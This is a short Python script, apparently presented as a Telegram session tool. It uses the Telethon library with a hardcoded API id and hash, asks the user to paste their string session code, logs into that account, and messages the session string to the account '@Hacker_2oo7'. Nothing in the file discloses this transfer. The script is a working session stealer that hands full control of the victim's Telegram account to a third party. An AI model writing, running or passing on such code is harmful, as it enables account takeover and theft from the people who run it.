from telethon import TelegramClient
from telethon.sessions import StringSession

api_id = 9708508
api_hash = "1e6ca420184a701db1f8a1301df99288"

string = input("String session code: ")
with TelegramClient(StringSession(string), api_id, api_hash) as client:
    client.send_message("@Hacker_2oo7", client.session.save())
